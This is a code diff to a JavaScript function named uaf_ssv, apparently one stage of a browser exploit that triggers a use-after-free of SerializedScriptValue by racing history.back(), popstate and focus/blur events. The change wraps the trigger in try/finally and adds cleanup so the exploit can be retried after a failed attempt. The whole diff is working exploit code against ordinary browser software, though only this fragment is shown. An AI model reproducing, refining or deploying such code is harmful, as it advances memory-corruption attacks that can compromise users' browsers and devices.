@@ -197,6 +197,7 @@ async function uaf_ssv(fsets, index, index2) {
   let pop_promise2 = null;
   let blurs = [0, 0];
   let resolves = [];
+  let completed = false;
 
   function onpopstate(event) {
     const no_pop = pop === null;
@@ -262,12 +263,13 @@ async function uaf_ssv(fsets, index, index2) {
     blurs[idx]++;
   }
 
-  input.addEventListener("blur", onblur);
-  foo.addEventListener("blur", onblur);
+  try {
+    input.addEventListener("blur", onblur);
+    foo.addEventListener("blur", onblur);
 
-  document.body.append(input);
-  document.body.append(foo);
-  document.body.append(bar);
+    document.body.append(input);
+    document.body.append(foo);
+    document.body.append(bar);
 
   // FrameLoader::loadInSameDocument() calls Document::statePopped().
   // statePopped() will defer firing of popstate until we're in the complete
@@ -277,33 +279,33 @@ async function uaf_ssv(fsets, index, index2) {
   // item if we call loadInSameDocument too early
   log(`readyState now: ${document.readyState}`);
 
-  if (document.readyState !== "complete") {
-    await new Promise((resolve) => {
-      document.addEventListener("readystatechange", function foo() {
-        if (document.readyState === "complete") {
-          document.removeEventListener("readystatechange", foo);
-          resolve();
-        }
+    if (document.readyState !== "complete") {
+      await new Promise((resolve) => {
+        document.addEventListener("readystatechange", function foo() {
+          if (document.readyState === "complete") {
+            document.removeEventListener("readystatechange", foo);
+            resolve();
+          }
+        });
       });
-    });
-  }
+    }
 
   log(`readyState now: ${document.readyState}`);
 
-  await new Promise((resolve) => {
-    input.addEventListener("focus", resolve, { once: true });
-    input.focus();
-  });
+    await new Promise((resolve) => {
+      input.addEventListener("focus", resolve, { once: true });
+      input.focus();
+    });
 
-  history.back();
-  await pop_promise;
-  await pop_promise2;
+    history.back();
+    await pop_promise;
+    await pop_promise2;
 
   log("done await popstate");
 
-  input.remove();
-  foo.remove();
-  bar.remove();
+    input.remove();
+    foo.remove();
+    bar.remove();
 
   const res = [];
   for (let i = 0; i < views.length; i++) {
@@ -329,10 +331,22 @@ async function uaf_ssv(fsets, index, index2) {
     }
   }
 
-  if (res.length !== 2) {
-    die("failed SerializedScriptValue UAF");
+    if (res.length !== 2) {
+      die("failed SerializedScriptValue UAF");
+    }
+    completed = true;
+    return res;
+  } finally {
+    if (!completed) {
+      removeEventListener("popstate", onpopstate);
+      input.removeEventListener("blur", onblur);
+      foo.removeEventListener("blur", onblur);
+      input.remove();
+      foo.remove();
+      bar.remove();
+      views.length = 0;
+    }
   }
-  return res;
 }
 
 class Reader {
